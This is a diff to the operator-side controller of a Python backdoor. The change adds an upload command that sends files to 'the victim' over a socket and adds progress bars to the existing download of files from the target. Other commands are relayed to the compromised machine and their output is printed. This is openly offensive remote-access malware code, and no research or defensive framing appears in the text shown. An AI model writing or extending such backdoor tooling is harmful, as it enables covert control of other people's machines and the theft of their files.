@@ -1,3 +1,4 @@
+import os.path
 import socket
 from tqdm import tqdm
 
@@ -15,10 +16,34 @@ def handle_command(client_socket):
 
         elif command.lower() == "download":
                 receive_file(client_socket)
+
+        elif command.lower() == "upload":
+                upload_file(client_socket)
         else:
             # For regular commands, print the output received from the target
             output = client_socket.recv(4096).decode()
             print(output)
+
+def upload_file(client_socket):
+ #Upload Function
+ filename = input("Input the Filename: ")
+ if os.path.exists(filename):
+
+     # Get the size of the file
+     file_size = os.path.getsize(filename)
+     print(f"Sending file: {filename} of size {file_size} bytes")
+
+     # Send the file size to the victim
+     client_socket.sendall(str(file_size).encode('utf-8'))
+     with open(filename, 'rb') as file:
+         bytes_sent = 0
+         with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Sending {filename}") as pbar:
+             while bytes_sent < file_size:
+                 chunk = file.read(1024)
+                 client_socket.sendall(chunk)
+                 bytes_sent += len(chunk)
+                 pbar.update(len(chunk))
+         print(f"File '{filename}' sent successfully. Total bytes sent: {bytes_sent}")
 
 
 # Function to receive file from the backdoor
@@ -37,12 +62,14 @@ def receive_file(client_socket):
         bytes_received = 0
 
         with open(filename, 'wb') as file:  # Open the file to save it locally
+         with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Uploading {filename}") as pbar:
             while bytes_received < file_size:
                chunk = client_socket.recv(1024)
 
                file.write(chunk)
 
                bytes_received += len(chunk)
+               pbar.update(len(chunk))
                print(f"Received {bytes_received}/{file_size} bytes")
 
         print(f"File {filename} received successfully. Total bytes received: {bytes_received}")
